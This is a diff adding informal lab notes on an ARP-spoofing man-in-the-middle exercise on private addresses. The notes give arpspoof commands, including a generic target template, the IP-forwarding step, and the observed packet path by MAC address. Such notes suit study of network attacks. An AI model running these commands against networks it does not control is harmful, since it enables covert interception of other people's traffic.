@@ -1,0 +1,41 @@
+sudo arpspoof -i eth1 172.21.152.1
+
+Pinging devices 172.21.153.20 and 172.21.153.10 worked:
+Did not need to specifz the interface but it didn'f hurt:
+
+$ ping -I eth1 172.21.153.20
+
+Enable ip forwarding:
+$ sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
+
+
+$ sudo arpspoof -i <interface> -t <target to attack with arpspoofing> <host which intercepts the packets>
+
+Wee need the address of our host so we need to find out that:
+
+
+Last command:
+sudo arpspoof -i eth1 -t 172.21.153.20 172.21.153.10
+
+We're redirecting traffic with mac addresses:
+172.21.153.20 -> 172.21.153.10
+
+"84" is sending out ARP signals to "ee" that there is 172.21.153.10 at "84"
+
+Goes:
+172.21.153.20 -> 172.21.152.101 -> 172.21.153.10
+PcsCompu_62:02:ee -> PcsCompu_df:09:84 
+PcsCompu_df:09:84 -> PcsCompu_62:02:ee (sends back?)
+PcsCompu_df:09:84 -> PcsCompu_66:17:ab
+
+We are sending packets back from 101 to 20 with ICMP protocol. The original message is encapsulated, keeping the original 
+src and dst MAC and IPs untouched. 
+This is then sent from 20 to 10.
+
+
+
+
+172.21.153.20 -> 172.21.152.101 -> 172.21.153.20 -> 172.21.153.10
+
+172.21.153.20 -> 172.21.153.10
+172.21.153.20 -> 172.21.153.10
